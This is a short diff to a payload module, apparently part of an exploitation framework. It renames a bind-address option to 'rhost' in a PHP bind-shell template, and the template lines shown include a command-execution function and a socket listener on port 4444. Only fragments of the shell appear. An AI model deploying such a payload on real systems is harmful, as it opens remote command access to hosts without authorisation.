@@ -16,7 +16,7 @@ class Module(Payload):
         'session_type': SessionType.PHP
     }
 
-    bind_host = OptString('0.0.0.0', 'Address to bind on the target', True)
+    rhost = OptString('0.0.0.0', 'Address to bind on the target', True)
     rport = OptPort(4444, 'Port to bind on the target', True)
     encoder = OptString('', 'Encoder', False, True)
 
@@ -50,7 +50,7 @@ function exec_cmd($c){{
   }}
   return $o;
 }}
-$addr='{self.bind_host}';
+$addr='{self.rhost}';
 $port={self.rport};
 $server=@stream_socket_server('tcp://'.$addr.':'.$port,$errno,$errstr);
 if($server){{
